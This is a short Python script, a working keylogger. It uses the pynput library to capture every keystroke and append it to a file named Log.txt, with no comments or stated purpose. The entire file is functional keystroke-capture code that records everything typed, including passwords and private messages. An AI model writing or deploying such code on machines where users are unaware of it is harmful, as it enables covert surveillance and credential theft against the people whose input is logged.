import pynput
from pynput.keyboard import Listener

def on_press(key):
    with open("Log.txt", "a") as f:
        f.write(str(key)+ "\n")
    

with Listener(on_press=on_press) as Listener:
    Listener.join()
